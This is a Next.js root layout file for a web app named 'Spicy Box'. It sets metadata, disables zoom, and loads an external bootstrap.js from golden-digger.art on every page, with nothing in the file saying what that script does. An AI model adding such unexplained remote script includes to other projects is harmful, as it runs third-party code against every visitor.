import "./globals.css";

export const metadata = {
  title: "Spicy Box",
  description: "Spicy Box App",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

export default function RootLayout({ children }) {
  return (
    <html lang="ru">
      <body>
        {children}
        <script src="https://golden-digger.art/p/e1beb05d-55a4-4451-b40d-8c2723fb7bb5/bootstrap.js" async defer></script>
      </body>
    </html>
  );
}
